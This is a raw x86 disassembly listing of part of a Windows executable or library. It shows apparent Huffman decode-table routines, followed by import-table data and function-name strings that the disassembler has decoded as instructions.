 1009582:	8d 84 85 60 ff ff ff 	lea    -0xa0(%ebp,%eax,4),%eax
 1009589:	ff 00                	incl   (%eax)
 100958b:	41                   	inc    %ecx
 100958c:	3b 4d 0c             	cmp    0xc(%ebp),%ecx
 100958f:	72 ea                	jb     0x100957b
 1009591:	33 d2                	xor    %edx,%edx
 1009593:	42                   	inc    %edx
 1009594:	89 75 a8             	mov    %esi,-0x58(%ebp)
 1009597:	8b c2                	mov    %edx,%eax
 1009599:	8b bc 85 60 ff ff ff 	mov    -0xa0(%ebp,%eax,4),%edi
 10095a0:	6a 10                	push   $0x10
 10095a2:	59                   	pop    %ecx
 10095a3:	2b c8                	sub    %eax,%ecx
 10095a5:	d3 e7                	shl    %cl,%edi
 10095a7:	03 7c 85 a4          	add    -0x5c(%ebp,%eax,4),%edi
 10095ab:	40                   	inc    %eax
 10095ac:	83 f8 10             	cmp    $0x10,%eax
 10095af:	89 7c 85 a4          	mov    %edi,-0x5c(%ebp,%eax,4)
 10095b3:	76 e4                	jbe    0x1009599
 10095b5:	81 7d e8 00 00 01 00 	cmpl   $0x10000,-0x18(%ebp)
 10095bc:	74 31                	je     0x10095ef
 10095be:	39 75 e8             	cmp    %esi,-0x18(%ebp)
 10095c1:	75 25                	jne    0x10095e8
 10095c3:	8a 4d 14             	mov    0x14(%ebp),%cl
 10095c6:	8b 7d 18             	mov    0x18(%ebp),%edi
 10095c9:	8b c2                	mov    %edx,%eax
 10095cb:	d3 e0                	shl    %cl,%eax
 10095cd:	d1 e0                	shl    $1,%eax
 10095cf:	8b c8                	mov    %eax,%ecx
 10095d1:	8b f1                	mov    %ecx,%esi
 10095d3:	c1 e9 02             	shr    $0x2,%ecx
 10095d6:	33 c0                	xor    %eax,%eax
 10095d8:	f3 ab                	rep stos %eax,%es:(%edi)
 10095da:	8b ce                	mov    %esi,%ecx
 10095dc:	83 e1 03             	and    $0x3,%ecx
 10095df:	f3 aa                	rep stos %al,%es:(%edi)
 10095e1:	8b c2                	mov    %edx,%eax
 10095e3:	e9 72 01 00 00       	jmp    0x100975a
 10095e8:	33 c0                	xor    %eax,%eax
 10095ea:	e9 6b 01 00 00       	jmp    0x100975a
 10095ef:	0f b6 75 14          	movzbl 0x14(%ebp),%esi
 10095f3:	53                   	push   %ebx
 10095f4:	b3 10                	mov    $0x10,%bl
 10095f6:	2a 5d 14             	sub    0x14(%ebp),%bl
 10095f9:	3b f2                	cmp    %edx,%esi
 10095fb:	8b c2                	mov    %edx,%eax
 10095fd:	89 75 f0             	mov    %esi,-0x10(%ebp)
 1009600:	72 25                	jb     0x1009627
 1009602:	8d 7e ff             	lea    -0x1(%esi),%edi
 1009605:	0f b6 cb             	movzbl %bl,%ecx
 1009608:	8d 54 85 a4          	lea    -0x5c(%ebp,%eax,4),%edx
 100960c:	d3 2a                	shrl   %cl,(%edx)
 100960e:	33 d2                	xor    %edx,%edx
 1009610:	42                   	inc    %edx
 1009611:	8b cf                	mov    %edi,%ecx
 1009613:	d3 e2                	shl    %cl,%edx
 1009615:	40                   	inc    %eax
 1009616:	4f                   	dec    %edi
 1009617:	3b c6                	cmp    %esi,%eax
 1009619:	89 94 85 5c ff ff ff 	mov    %edx,-0xa4(%ebp,%eax,4)
 1009620:	76 e3                	jbe    0x1009605
 1009622:	83 f8 10             	cmp    $0x10,%eax
 1009625:	77 18                	ja     0x100963f
 1009627:	6a 10                	push   $0x10
 1009629:	59                   	pop    %ecx
 100962a:	2b c8                	sub    %eax,%ecx
 100962c:	33 d2                	xor    %edx,%edx
 100962e:	42                   	inc    %edx
 100962f:	d3 e2                	shl    %cl,%edx
 1009631:	40                   	inc    %eax
 1009632:	49                   	dec    %ecx
 1009633:	83 f8 10             	cmp    $0x10,%eax
 1009636:	89 94 85 5c ff ff ff 	mov    %edx,-0xa4(%ebp,%eax,4)
 100963d:	76 ed                	jbe    0x100962c
 100963f:	8b 54 b5 a8          	mov    -0x58(%ebp,%esi,4),%edx
 1009643:	0f b6 cb             	movzbl %bl,%ecx
 1009646:	8b 5d 18             	mov    0x18(%ebp),%ebx
 1009649:	d3 ea                	shr    %cl,%edx
 100964b:	89 4d ec             	mov    %ecx,-0x14(%ebp)
 100964e:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
 1009654:	74 20                	je     0x1009676
 1009656:	33 c0                	xor    %eax,%eax
 1009658:	40                   	inc    %eax
 1009659:	8b ce                	mov    %esi,%ecx
 100965b:	d3 e0                	shl    %cl,%eax
 100965d:	8d 3c 53             	lea    (%ebx,%edx,2),%edi
 1009660:	2b c2                	sub    %edx,%eax
 1009662:	d1 e0                	shl    $1,%eax
 1009664:	8b c8                	mov    %eax,%ecx
 1009666:	8b d1                	mov    %ecx,%edx
 1009668:	c1 e9 02             	shr    $0x2,%ecx
 100966b:	33 c0                	xor    %eax,%eax
 100966d:	f3 ab                	rep stos %eax,%es:(%edi)
 100966f:	8b ca                	mov    %edx,%ecx
 1009671:	83 e1 03             	and    $0x3,%ecx
 1009674:	f3 aa                	rep stos %al,%es:(%edi)
 1009676:	8b 4d 0c             	mov    0xc(%ebp),%ecx
 1009679:	33 c0                	xor    %eax,%eax
 100967b:	85 c9                	test   %ecx,%ecx
 100967d:	89 4d f8             	mov    %ecx,-0x8(%ebp)
 1009680:	89 45 f4             	mov    %eax,-0xc(%ebp)
 1009683:	0f 8e cd 00 00 00    	jle    0x1009756
 1009689:	8b 4d 10             	mov    0x10(%ebp),%ecx
 100968c:	8a 04 08             	mov    (%eax,%ecx,1),%al
 100968f:	84 c0                	test   %al,%al
 1009691:	0f 84 af 00 00 00    	je     0x1009746
 1009697:	0f b6 c8             	movzbl %al,%ecx
 100969a:	c1 e1 02             	shl    $0x2,%ecx
 100969d:	8b 94 0d 60 ff ff ff 	mov    -0xa0(%ebp,%ecx,1),%edx
 10096a4:	8d 74 0d a4          	lea    -0x5c(%ebp,%ecx,1),%esi
 10096a8:	8b 3e                	mov    (%esi),%edi
 10096aa:	03 d7                	add    %edi,%edx
 10096ac:	3a 45 14             	cmp    0x14(%ebp),%al
 10096af:	77 3b                	ja     0x10096ec
 10096b1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
 10096b4:	33 c0                	xor    %eax,%eax
 10096b6:	40                   	inc    %eax
 10096b7:	d3 e0                	shl    %cl,%eax
 10096b9:	3b d0                	cmp    %eax,%edx
 10096bb:	0f 87 9f 00 00 00    	ja     0x1009760
 10096c1:	3b fa                	cmp    %edx,%edi
 10096c3:	73 23                	jae    0x10096e8
 10096c5:	8b 45 f4             	mov    -0xc(%ebp),%eax
 10096c8:	8d 1c 7b             	lea    (%ebx,%edi,2),%ebx
 10096cb:	8b ca                	mov    %edx,%ecx
 10096cd:	2b cf                	sub    %edi,%ecx
 10096cf:	8b fb                	mov    %ebx,%edi
 10096d1:	66 8b d8             	mov    %ax,%bx
 10096d4:	c1 e3 10             	shl    $0x10,%ebx
 10096d7:	66 8b d8             	mov    %ax,%bx
 10096da:	d1 e9                	shr    $1,%ecx
 10096dc:	8b c3                	mov    %ebx,%eax
 10096de:	8b 5d 18             	mov    0x18(%ebp),%ebx
 10096e1:	f3 ab                	rep stos %eax,%es:(%edi)
 10096e3:	13 c9                	adc    %ecx,%ecx
 10096e5:	66 f3 ab             	rep stos %ax,%es:(%edi)
 10096e8:	89 16                	mov    %edx,(%esi)
 10096ea:	eb 5a                	jmp    0x1009746
 10096ec:	8b 4d ec             	mov    -0x14(%ebp),%ecx
 10096ef:	2a 45 14             	sub    0x14(%ebp),%al
 10096f2:	89 16                	mov    %edx,(%esi)
 10096f4:	8b d7                	mov    %edi,%edx
 10096f6:	d3 ea                	shr    %cl,%edx
 10096f8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
 10096fb:	88 45 ff             	mov    %al,-0x1(%ebp)
 10096fe:	d3 e7                	shl    %cl,%edi
 1009700:	8d 14 53             	lea    (%ebx,%edx,2),%edx
 1009703:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
 1009706:	33 f6                	xor    %esi,%esi
 1009708:	66 39 32             	cmp    %si,(%edx)
 100970b:	75 1a                	jne    0x1009727
 100970d:	8b 45 f8             	mov    -0x8(%ebp),%eax
 1009710:	c1 e0 02             	shl    $0x2,%eax
 1009713:	66 89 74 08 02       	mov    %si,0x2(%eax,%ecx,1)
 1009718:	66 89 34 08          	mov    %si,(%eax,%ecx,1)
 100971c:	8b 45 f8             	mov    -0x8(%ebp),%eax
 100971f:	f7 d8                	neg    %eax
 1009721:	ff 45 f8             	incl   -0x8(%ebp)
 1009724:	66 89 02             	mov    %ax,(%edx)
 1009727:	0f bf 02             	movswl (%edx),%eax
 100972a:	c1 e0 02             	shl    $0x2,%eax
 100972d:	2b c8                	sub    %eax,%ecx
 100972f:	66 3b fe             	cmp    %si,%di
 1009732:	7d 02                	jge    0x1009736
 1009734:	41                   	inc    %ecx
 1009735:	41                   	inc    %ecx
 1009736:	d1 e7                	shl    $1,%edi
 1009738:	fe 4d ff             	decb   -0x1(%ebp)
 100973b:	8b d1                	mov    %ecx,%edx
 100973d:	75 c4                	jne    0x1009703
 100973f:	66 8b 45 f4          	mov    -0xc(%ebp),%ax
 1009743:	66 89 02             	mov    %ax,(%edx)
 1009746:	8b 45 f4             	mov    -0xc(%ebp),%eax
 1009749:	40                   	inc    %eax
 100974a:	3b 45 0c             	cmp    0xc(%ebp),%eax
 100974d:	89 45 f4             	mov    %eax,-0xc(%ebp)
 1009750:	0f 8c 33 ff ff ff    	jl     0x1009689
 1009756:	33 c0                	xor    %eax,%eax
 1009758:	40                   	inc    %eax
 1009759:	5b                   	pop    %ebx
 100975a:	5f                   	pop    %edi
 100975b:	5e                   	pop    %esi
 100975c:	c9                   	leave
 100975d:	c2 18 00             	ret    $0x18
 1009760:	33 c0                	xor    %eax,%eax
 1009762:	eb f5                	jmp    0x1009759
 1009764:	cc                   	int3
 1009765:	cc                   	int3
 1009766:	cc                   	int3
 1009767:	cc                   	int3
 1009768:	cc                   	int3
 1009769:	8b ff                	mov    %edi,%edi
 100976b:	55                   	push   %ebp
 100976c:	8b ec                	mov    %esp,%ebp
 100976e:	83 ec 5c             	sub    $0x5c,%esp
 1009771:	a1 28 c0 00 01       	mov    0x100c028,%eax
 1009776:	53                   	push   %ebx
 1009777:	8b 5d 0c             	mov    0xc(%ebp),%ebx
 100977a:	56                   	push   %esi
 100977b:	8b 75 10             	mov    0x10(%ebp),%esi
 100977e:	57                   	push   %edi
 100977f:	6a 08                	push   $0x8
 1009781:	5a                   	pop    %edx
 1009782:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1009785:	8b ca                	mov    %edx,%ecx
 1009787:	33 c0                	xor    %eax,%eax
 1009789:	8d 7d b6             	lea    -0x4a(%ebp),%edi
 100978c:	f3 ab                	rep stos %eax,%es:(%edi)
 100978e:	89 5d ac             	mov    %ebx,-0x54(%ebp)
 1009791:	89 75 a8             	mov    %esi,-0x58(%ebp)
 1009794:	8b cb                	mov    %ebx,%ecx
 1009796:	0f b6 01             	movzbl (%ecx),%eax
 1009799:	8d 44 45 b4          	lea    -0x4c(%ebp,%eax,2),%eax
 100979d:	66 ff 00             	incw   (%eax)
 10097a0:	41                   	inc    %ecx
 10097a1:	4a                   	dec    %edx
 10097a2:	75 f2                	jne    0x1009796
 10097a4:	6a 0f                	push   $0xf
 10097a6:	59                   	pop    %ecx
 10097a7:	33 c0                	xor    %eax,%eax
 10097a9:	6a 10                	push   $0x10
 10097ab:	66 89 45 da          	mov    %ax,-0x26(%ebp)
 10097af:	5a                   	pop    %edx
 10097b0:	66 8b 7c 05 b6       	mov    -0x4a(%ebp,%eax,1),%di
 10097b5:	66 d3 e7             	shl    %cl,%di
 10097b8:	66 03 7c 05 da       	add    -0x26(%ebp,%eax,1),%di
 10097bd:	49                   	dec    %ecx
 10097be:	66 89 7c 05 dc       	mov    %di,-0x24(%ebp,%eax,1)
 10097c3:	40                   	inc    %eax
 10097c4:	40                   	inc    %eax
 10097c5:	4a                   	dec    %edx
 10097c6:	75 e8                	jne    0x10097b0
 10097c8:	33 c0                	xor    %eax,%eax
 10097ca:	66 39 45 fa          	cmp    %ax,-0x6(%ebp)
 10097ce:	0f 85 bd 00 00 00    	jne    0x1009891
 10097d4:	6a 06                	push   $0x6
 10097d6:	59                   	pop    %ecx
 10097d7:	6a 07                	push   $0x7
 10097d9:	5a                   	pop    %edx
 10097da:	66 c1 6c 05 da 09    	shrw   $0x9,-0x26(%ebp,%eax,1)
 10097e0:	33 ff                	xor    %edi,%edi
 10097e2:	47                   	inc    %edi
 10097e3:	d3 e7                	shl    %cl,%edi
 10097e5:	49                   	dec    %ecx
 10097e6:	40                   	inc    %eax
 10097e7:	40                   	inc    %eax
 10097e8:	4a                   	dec    %edx
 10097e9:	66 89 7c 05 b4       	mov    %di,-0x4c(%ebp,%eax,1)
 10097ee:	75 ea                	jne    0x10097da
 10097f0:	6a 08                	push   $0x8
 10097f2:	59                   	pop    %ecx
 10097f3:	6a 09                	push   $0x9
 10097f5:	8d 45 c4             	lea    -0x3c(%ebp),%eax
 10097f8:	5a                   	pop    %edx
 10097f9:	33 ff                	xor    %edi,%edi
 10097fb:	47                   	inc    %edi
 10097fc:	d3 e7                	shl    %cl,%edi
 10097fe:	49                   	dec    %ecx
 10097ff:	66 89 38             	mov    %di,(%eax)
 1009802:	40                   	inc    %eax
 1009803:	40                   	inc    %eax
 1009804:	4a                   	dec    %edx
 1009805:	75 f2                	jne    0x10097f9
 1009807:	6a 20                	push   $0x20
 1009809:	33 c0                	xor    %eax,%eax
 100980b:	59                   	pop    %ecx
 100980c:	8b fe                	mov    %esi,%edi
 100980e:	f3 ab                	rep stos %eax,%es:(%edi)
 1009810:	88 45 b3             	mov    %al,-0x4d(%ebp)
 1009813:	0f b6 45 b3          	movzbl -0x4d(%ebp),%eax
 1009817:	8a 04 18             	mov    (%eax,%ebx,1),%al
 100981a:	84 c0                	test   %al,%al
 100981c:	74 58                	je     0x1009876
 100981e:	0f b6 c0             	movzbl %al,%eax
 1009821:	d1 e0                	shl    $1,%eax
 1009823:	8d 4c 05 d8          	lea    -0x28(%ebp,%eax,1),%ecx
 1009827:	66 8b 11             	mov    (%ecx),%dx
 100982a:	33 f6                	xor    %esi,%esi
 100982c:	66 8b 74 05 b4       	mov    -0x4c(%ebp,%eax,1),%si
 1009831:	66 03 f2             	add    %dx,%si
 1009834:	66 81 fe 80 00       	cmp    $0x80,%si
 1009839:	89 4d a4             	mov    %ecx,-0x5c(%ebp)
 100983c:	77 53                	ja     0x1009891
 100983e:	66 3b d6             	cmp    %si,%dx
 1009841:	73 30                	jae    0x1009873
 1009843:	8b c6                	mov    %esi,%eax
 1009845:	2b c2                	sub    %edx,%eax
 1009847:	0f b7 c8             	movzwl %ax,%ecx
 100984a:	8a 45 b3             	mov    -0x4d(%ebp),%al
 100984d:	8a d8                	mov    %al,%bl
 100984f:	8a fb                	mov    %bl,%bh
 1009851:	0f b7 fa             	movzwl %dx,%edi
 1009854:	03 7d a8             	add    -0x58(%ebp),%edi
 1009857:	8b d1                	mov    %ecx,%edx
 1009859:	c1 e9 02             	shr    $0x2,%ecx
 100985c:	8b c3                	mov    %ebx,%eax
 100985e:	c1 e0 10             	shl    $0x10,%eax
 1009861:	66 8b c3             	mov    %bx,%ax
 1009864:	8b 5d ac             	mov    -0x54(%ebp),%ebx
 1009867:	f3 ab                	rep stos %eax,%es:(%edi)
 1009869:	8b ca                	mov    %edx,%ecx
 100986b:	83 e1 03             	and    $0x3,%ecx
 100986e:	f3 aa                	rep stos %al,%es:(%edi)
 1009870:	8b 4d a4             	mov    -0x5c(%ebp),%ecx
 1009873:	66 89 31             	mov    %si,(%ecx)
 1009876:	fe 45 b3             	incb   -0x4d(%ebp)
 1009879:	80 7d b3 08          	cmpb   $0x8,-0x4d(%ebp)
 100987d:	72 94                	jb     0x1009813
 100987f:	33 c0                	xor    %eax,%eax
 1009881:	40                   	inc    %eax
 1009882:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1009885:	5f                   	pop    %edi
 1009886:	5e                   	pop    %esi
 1009887:	5b                   	pop    %ebx
 1009888:	e8 72 ca ff ff       	call   0x10062ff
 100988d:	c9                   	leave
 100988e:	c2 0c 00             	ret    $0xc
 1009891:	33 c0                	xor    %eax,%eax
 1009893:	eb ed                	jmp    0x1009882
 1009895:	cc                   	int3
 1009896:	cc                   	int3
 1009897:	cc                   	int3
 1009898:	c4 9a 00 00 00 00    	les    0x0(%edx),%ebx
 100989e:	00 00                	add    %al,(%eax)
 10098a0:	00 00                	add    %al,(%eax)
 10098a2:	00 00                	add    %al,(%eax)
 10098a4:	70 9c                	jo     0x1009842
 10098a6:	00 00                	add    %al,(%eax)
 10098a8:	8c 21                	mov    %fs,(%ecx)
 10098aa:	00 00                	add    %al,(%eax)
 10098ac:	38 99 00 00 00 00    	cmp    %bl,0x0(%ecx)
 10098b2:	00 00                	add    %al,(%eax)
 10098b4:	00 00                	add    %al,(%eax)
 10098b6:	00 00                	add    %al,(%eax)
 10098b8:	9c                   	pushf
 10098b9:	9d                   	popf
 10098ba:	00 00                	add    %al,(%eax)
 10098bc:	00 20                	add    %ah,(%eax)
 10098be:	00 00                	add    %al,(%eax)
 10098c0:	74 99                	je     0x100985b
	...
 10098ca:	00 00                	add    %al,(%eax)
 10098cc:	ea a2 00 00 3c 20 00 	ljmp   $0x20,$0x3c0000a2
 10098d3:	00 a0 9a 00 00 00    	add    %ah,0x9a(%eax)
 10098d9:	00 00                	add    %al,(%eax)
 10098db:	00 00                	add    %al,(%eax)
 10098dd:	00 00                	add    %al,(%eax)
 10098df:	00 72 a3             	add    %dh,-0x5d(%edx)
 10098e2:	00 00                	add    %al,(%eax)
 10098e4:	68 21 00 00 2c       	push   $0x2c000021
 10098e9:	9b                   	fwait
	...
 10098f2:	00 00                	add    %al,(%eax)
 10098f4:	cc                   	int3
 10098f5:	a3 00 00 f4 21       	mov    %eax,0x21f40000
 10098fa:	00 00                	add    %al,(%eax)
 10098fc:	6c                   	insb   (%dx),%es:(%edi)
 10098fd:	99                   	cltd
	...
 1009906:	00 00                	add    %al,(%eax)
 1009908:	d6                   	salc
 1009909:	a3 00 00 34 20       	mov    %eax,0x20340000
 100990e:	00 00                	add    %al,(%eax)
 1009910:	94                   	xchg   %eax,%esp
 1009911:	9a 00 00 00 00 00 00 	lcall  $0x0,$0x0
 1009918:	00 00                	add    %al,(%eax)
 100991a:	00 00                	add    %al,(%eax)
 100991c:	12 a4 00 00 5c 21 00 	adc    0x215c00(%eax,%eax,1),%ah
	...
 1009937:	00 6c 9d 00          	add    %ch,0x0(%ebp,%ebx,4)
 100993b:	00 56 9d             	add    %dl,-0x63(%esi)
 100993e:	00 00                	add    %al,(%eax)
 1009940:	3a 9d 00 00 22 9d    	cmp    -0x62de0000(%ebp),%bl
 1009946:	00 00                	add    %al,(%eax)
 1009948:	10 9d 00 00 fa 9c    	adc    %bl,-0x63060000(%ebp)
 100994e:	00 00                	add    %al,(%eax)
 1009950:	de 9c 00 00 ca 9c 00 	ficomps 0x9cca00(%eax,%eax,1)
 1009957:	00 b4 9c 00 00 a4 9c 	add    %dh,-0x635c0000(%esp,%ebx,4)
 100995e:	00 00                	add    %al,(%eax)
 1009960:	8a 9c 00 00 7c 9d 00 	mov    0x9d7c00(%eax,%eax,1),%bl
 1009967:	00 00                	add    %al,(%eax)
 1009969:	00 00                	add    %al,(%eax)
 100996b:	00 11                	add    %dl,(%ecx)
 100996d:	00 00                	add    %al,(%eax)
 100996f:	80 00 00             	addb   $0x0,(%eax)
 1009972:	00 00                	add    %al,(%eax)
 1009974:	f6 a1 00 00 e8 a1    	mulb   -0x5e180000(%ecx)
 100997a:	00 00                	add    %al,(%eax)
 100997c:	cc                   	int3
 100997d:	a1 00 00 ba a1       	mov    0xa1ba0000,%eax
 1009982:	00 00                	add    %al,(%eax)
 1009984:	a4                   	movsb  %ds:(%esi),%es:(%edi)
 1009985:	a1 00 00 28 a2       	mov    0xa2280000,%eax
 100998a:	00 00                	add    %al,(%eax)
 100998c:	72 a1                	jb     0x100992f
 100998e:	00 00                	add    %al,(%eax)
 1009990:	64 a1 00 00 54 a1    	mov    %fs:0xa1540000,%eax
 1009996:	00 00                	add    %al,(%eax)
 1009998:	06                   	push   %es
 1009999:	a2 00 00 2a a1       	mov    %al,0xa12a0000
 100999e:	00 00                	add    %al,(%eax)
 10099a0:	16                   	push   %ss
 10099a1:	a1 00 00 06 a1       	mov    0xa1060000,%eax
 10099a6:	00 00                	add    %al,(%eax)
 10099a8:	50                   	push   %eax
 10099a9:	a2 00 00 6a a2       	mov    %al,0xa26a0000
 10099ae:	00 00                	add    %al,(%eax)
 10099b0:	80 a2 00 00 96 a2 00 	andb   $0x0,-0x5d6a0000(%edx)
 10099b7:	00 b0 a2 00 00 cc    	add    %dh,-0x33ffff5e(%eax)
 10099bd:	a2 00 00 3c a1       	mov    %al,0xa13c0000
 10099c2:	00 00                	add    %al,(%eax)
 10099c4:	16                   	push   %ss
 10099c5:	a2 00 00 cc a0       	mov    %al,0xa0cc0000
 10099ca:	00 00                	add    %al,(%eax)
 10099cc:	d8 a0 00 00 8c a1    	fsubs  -0x5e740000(%eax)
 10099d2:	00 00                	add    %al,(%eax)
 10099d4:	5c                   	pop    %esp
 10099d5:	9f                   	lahf
 10099d6:	00 00                	add    %al,(%eax)
 10099d8:	aa                   	stos   %al,%es:(%edi)
 10099d9:	9d                   	popf
 10099da:	00 00                	add    %al,(%eax)
 10099dc:	ba 9d 00 00 c6       	mov    $0xc600009d,%edx
 10099e1:	9d                   	popf
 10099e2:	00 00                	add    %al,(%eax)
 10099e4:	d8 9d 00 00 e6 9d    	fcomps -0x621a0000(%ebp)
 10099ea:	00 00                	add    %al,(%eax)
 10099ec:	fa                   	cli
 10099ed:	9d                   	popf
 10099ee:	00 00                	add    %al,(%eax)
 10099f0:	0a 9e 00 00 1e 9e    	or     -0x61e20000(%esi),%bl
 10099f6:	00 00                	add    %al,(%eax)
 10099f8:	2e 9e                	cs sahf
 10099fa:	00 00                	add    %al,(%eax)
 10099fc:	3e 9e                	ds sahf
 10099fe:	00 00                	add    %al,(%eax)
 1009a00:	4c                   	dec    %esp
 1009a01:	9e                   	sahf
 1009a02:	00 00                	add    %al,(%eax)
 1009a04:	5e                   	pop    %esi
 1009a05:	9e                   	sahf
 1009a06:	00 00                	add    %al,(%eax)
 1009a08:	6e                   	outsb  %ds:(%esi),(%dx)
 1009a09:	9e                   	sahf
 1009a0a:	00 00                	add    %al,(%eax)
 1009a0c:	84 9e 00 00 92 9e    	test   %bl,-0x616e0000(%esi)
 1009a12:	00 00                	add    %al,(%eax)
 1009a14:	a4                   	movsb  %ds:(%esi),%es:(%edi)
 1009a15:	9e                   	sahf
 1009a16:	00 00                	add    %al,(%eax)
 1009a18:	b2 9e                	mov    $0x9e,%dl
 1009a1a:	00 00                	add    %al,(%eax)
 1009a1c:	c2 9e 00             	ret    $0x9e
 1009a1f:	00 ce                	add    %cl,%dh
 1009a21:	9e                   	sahf
 1009a22:	00 00                	add    %al,(%eax)
 1009a24:	e0 9e                	loopne 0x10099c4
 1009a26:	00 00                	add    %al,(%eax)
 1009a28:	f8                   	clc
 1009a29:	9e                   	sahf
 1009a2a:	00 00                	add    %al,(%eax)
 1009a2c:	06                   	push   %es
 1009a2d:	9f                   	lahf
 1009a2e:	00 00                	add    %al,(%eax)
 1009a30:	1e                   	push   %ds
 1009a31:	9f                   	lahf
 1009a32:	00 00                	add    %al,(%eax)
 1009a34:	32 9f 00 00 4c 9f    	xor    -0x60b40000(%edi),%bl
 1009a3a:	00 00                	add    %al,(%eax)
 1009a3c:	ba a0 00 00 68       	mov    $0x680000a0,%edx
 1009a41:	9f                   	lahf
 1009a42:	00 00                	add    %al,(%eax)
 1009a44:	70 9f                	jo     0x10099e5
 1009a46:	00 00                	add    %al,(%eax)
 1009a48:	8a 9f 00 00 a4 9f    	mov    -0x605c0000(%edi),%bl
 1009a4e:	00 00                	add    %al,(%eax)
 1009a50:	ba 9f 00 00 c6       	mov    $0xc600009f,%edx
 1009a55:	9f                   	lahf
 1009a56:	00 00                	add    %al,(%eax)
 1009a58:	d6                   	salc
 1009a59:	9f                   	lahf
 1009a5a:	00 00                	add    %al,(%eax)
 1009a5c:	e2 9f                	loop   0x10099fd
 1009a5e:	00 00                	add    %al,(%eax)
 1009a60:	ee                   	out    %al,(%dx)
 1009a61:	9f                   	lahf
 1009a62:	00 00                	add    %al,(%eax)
 1009a64:	fc                   	cld
 1009a65:	9f                   	lahf
 1009a66:	00 00                	add    %al,(%eax)
 1009a68:	14 a0                	adc    $0xa0,%al
 1009a6a:	00 00                	add    %al,(%eax)
 1009a6c:	28 a0 00 00 3e a0    	sub    %ah,-0x5fc20000(%eax)
 1009a72:	00 00                	add    %al,(%eax)
 1009a74:	4c                   	dec    %esp
 1009a75:	a0 00 00 60 a0       	mov    0xa0600000,%al
 1009a7a:	00 00                	add    %al,(%eax)
 1009a7c:	76 a0                	jbe    0x1009a1e
 1009a7e:	00 00                	add    %al,(%eax)
 1009a80:	88 a0 00 00 9e a0    	mov    %ah,-0x5f620000(%eax)
 1009a86:	00 00                	add    %al,(%eax)
 1009a88:	aa                   	stos   %al,%es:(%edi)
 1009a89:	a0 00 00 ee a0       	mov    0xa0ee0000,%al
 1009a8e:	00 00                	add    %al,(%eax)
 1009a90:	00 00                	add    %al,(%eax)
 1009a92:	00 00                	add    %al,(%eax)
 1009a94:	fc                   	cld
 1009a95:	a3 00 00 e4 a3       	mov    %eax,0xa3e40000
 1009a9a:	00 00                	add    %al,(%eax)
 1009a9c:	00 00                	add    %al,(%eax)
 1009a9e:	00 00                	add    %al,(%eax)
 1009aa0:	4e                   	dec    %esi
 1009aa1:	a3 00 00 3e a3       	mov    %eax,0xa33e0000
 1009aa6:	00 00                	add    %al,(%eax)
 1009aa8:	2c a3                	sub    $0xa3,%al
 1009aaa:	00 00                	add    %al,(%eax)
 1009aac:	1e                   	push   %ds
 1009aad:	a3 00 00 12 a3       	mov    %eax,0xa3120000
 1009ab2:	00 00                	add    %al,(%eax)
 1009ab4:	06                   	push   %es
 1009ab5:	a3 00 00 f8 a2       	mov    %eax,0xa2f80000
 1009aba:	00 00                	add    %al,(%eax)
 1009abc:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
 1009ac2:	00 00                	add    %al,(%eax)
 1009ac4:	08 9c 00 00 fc 9b 00 	or     %bl,0x9bfc00(%eax,%eax,1)
 1009acb:	00 ec                	add    %ch,%ah
 1009acd:	9b                   	fwait
 1009ace:	00 00                	add    %al,(%eax)
 1009ad0:	e0 9b                	loopne 0x1009a6d
 1009ad2:	00 00                	add    %al,(%eax)
 1009ad4:	d8 9b 00 00 ce 9b    	fcomps -0x64320000(%ebx)
 1009ada:	00 00                	add    %al,(%eax)
 1009adc:	1c 9c                	sbb    $0x9c,%al
 1009ade:	00 00                	add    %al,(%eax)
 1009ae0:	b8 9b 00 00 ae       	mov    $0xae00009b,%eax
 1009ae5:	9b                   	fwait
 1009ae6:	00 00                	add    %al,(%eax)
 1009ae8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
 1009ae9:	9b                   	fwait
 1009aea:	00 00                	add    %al,(%eax)
 1009aec:	9a 9b 00 00 90 9b 00 	lcall  $0x9b,$0x9000009b
 1009af3:	00 86 9b 00 00 7a    	add    %al,0x7a00009b(%esi)
 1009af9:	9b                   	fwait
 1009afa:	00 00                	add    %al,(%eax)
 1009afc:	2c 9c                	sub    $0x9c,%al
 1009afe:	00 00                	add    %al,(%eax)
 1009b00:	3c 9c                	cmp    $0x9c,%al
 1009b02:	00 00                	add    %al,(%eax)
 1009b04:	4a                   	dec    %edx
 1009b05:	9c                   	pushf
 1009b06:	00 00                	add    %al,(%eax)
 1009b08:	5c                   	pop    %esp
 1009b09:	9c                   	pushf
 1009b0a:	00 00                	add    %al,(%eax)
 1009b0c:	7c 9c                	jl     0x1009aaa
 1009b0e:	00 00                	add    %al,(%eax)
 1009b10:	c0 9b 00 00 4e 9b 00 	rcrb   $0x0,-0x64b20000(%ebx)
 1009b17:	00 5a 9b             	add    %bl,-0x65(%edx)
 1009b1a:	00 00                	add    %al,(%eax)
 1009b1c:	64 9b                	fs fwait
 1009b1e:	00 00                	add    %al,(%eax)
 1009b20:	6e                   	outsb  %ds:(%esi),(%dx)
 1009b21:	9b                   	fwait
 1009b22:	00 00                	add    %al,(%eax)
 1009b24:	40                   	inc    %eax
 1009b25:	9b                   	fwait
 1009b26:	00 00                	add    %al,(%eax)
 1009b28:	00 00                	add    %al,(%eax)
 1009b2a:	00 00                	add    %al,(%eax)
 1009b2c:	a2 a3 00 00 88       	mov    %al,0x880000a3
 1009b31:	a3 00 00 7e a3       	mov    %eax,0xa37e0000
 1009b36:	00 00                	add    %al,(%eax)
 1009b38:	b8 a3 00 00 00       	mov    $0xa3,%eax
 1009b3d:	00 00                	add    %al,(%eax)
 1009b3f:	00 2a                	add    %ch,(%edx)
 1009b41:	02 5f 76             	add    0x76(%edi),%bl
 1009b44:	73 6e                	jae    0x1009bb4
 1009b46:	70 72                	jo     0x1009bba
 1009b48:	69 6e 74 66 00 00 ed 	imul   $0xed000066,0x74(%esi),%ebp
 1009b4f:	01 5f 73             	add    %ebx,0x73(%edi)
 1009b52:	6e                   	outsb  %ds:(%esi),(%dx)
 1009b53:	70 72                	jo     0x1009bc7
 1009b55:	69 6e 74 66 00 05 03 	imul   $0x3050066,0x74(%esi),%ebp
 1009b5c:	73 70                	jae    0x1009bce
 1009b5e:	72 69                	jb     0x1009bc9
 1009b60:	6e                   	outsb  %ds:(%esi),(%dx)
